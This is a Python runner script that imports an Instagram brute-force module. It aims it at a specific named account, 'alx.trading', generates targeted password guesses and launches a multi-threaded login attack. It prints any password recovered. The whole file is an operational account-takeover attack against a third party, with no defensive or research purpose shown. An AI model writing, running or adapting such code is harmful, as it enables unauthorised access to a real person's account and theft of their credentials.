#!/usr/bin/env python3
"""
Simple test runner for Instagram brute force
"""

# Simple test to run the brute force directly
import sys
sys.path.append('/workspaces/sugarglitch-realops/scripts')

try:
    from bruteforce_ig import AdvancedInstagramBruteForcer, generate_smart_passwords

    print("💀 INSTAGRAM BRUTE FORCE - QUICK ATTACK")
    print("🎯 Target: alx.trading")
    print("=" * 50)

    # Generate smart passwords for alx.trading
    print("🧠 Generating smart passwords...")
    passwords = list(generate_smart_passwords("alx.trading"))
    print(f"📋 Generated {len(passwords)} passwords")

    # Show first 10 passwords
    print("🔍 First 10 passwords to try:")
    for i, pwd in enumerate(passwords[:10], 1):
        print(f"   {i:2d}. {pwd}")

    # Create brute forcer instance
    print("\n🚀 Initializing brute forcer...")
    brute_forcer = AdvancedInstagramBruteForcer(
        target_username="alx.trading",
        password_list=passwords[:50],  # Use first 50 passwords for quick test
        proxy_list=None,
        use_tor=False
    )

    print("✅ Brute forcer initialized successfully!")
    print(f"🔄 Session pool: {len(brute_forcer.sessions)} sessions")
    print(f"🌐 Proxies: {len(brute_forcer.proxy_list)} (disabled)")

    # Start attack with limited passwords
    print("\n💀 Starting LIMITED brute force attack...")
    print("⚠️  This is a quick test with limited passwords")

    success = brute_forcer.hardcore_brute_force_attack(
        max_threads=3,  # Low thread count for testing
        smart_mode=True
    )

    if success:
        print(f"\n🎉 SUCCESS! Password found: {brute_forcer.found_password}")
    else:
        print(f"\n💔 No password found in this limited test")
        print(
            f"📊 Stats: Success={brute_forcer.success_count}, Failed={brute_forcer.failed_count}, Checkpoints={brute_forcer.checkpoint_count}")

except Exception as e:
    print(f"❌ Error: {e}")
    import traceback
    traceback.print_exc()
